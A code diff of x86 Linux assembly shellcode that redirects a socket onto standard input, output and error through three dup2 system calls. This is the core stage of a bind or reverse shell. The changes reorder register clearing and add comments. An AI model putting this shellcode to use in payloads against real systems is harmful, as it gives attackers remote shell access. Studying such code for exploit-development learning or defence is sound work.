@@ -37,14 +37,14 @@ add esp, 16
 mov edi, ebx ; moved sockfd to edi
 
 ;int dup2(int oldfd, int newfd);
+xor ecx,ecx
+mul ecx
+xor ebx,ebx
+
 CloneDescriptors:
-xor ecx,ecx
-mul ecx
-xor ebx,ebx
-
-mov al, 63
+mov al, 63 ; dup2 system call
 mov ebx,edi ; copied sockfd to ebx
-xor ecx, ecx ; standard input file descritor
+xor ecx, ecx ; standard input file descriptor
 int 0x80
 
 
@@ -52,16 +52,16 @@ xor ecx,ecx
 mul ecx
 xor ebx,ebx
 ;int dup2(int oldfd, int newfd);
-mov al, 63
+mov al, 63 ; dup2 system call
 mov ebx ,edi
-mov cl, 1
+mov cl, 1 ; standard output file descriptor
 int 0x80
 
 xor ecx,ecx
 mul ecx
 xor ebx,ebx
 ;int dup2(int oldfd, int newfd);
-mov al, 63
+mov al, 63 ; dup2 system call
 mov ebx, edi ; standard error file desciptor(2)
 mov cl, 2 ; copied sockfd to cl
 int 0x80
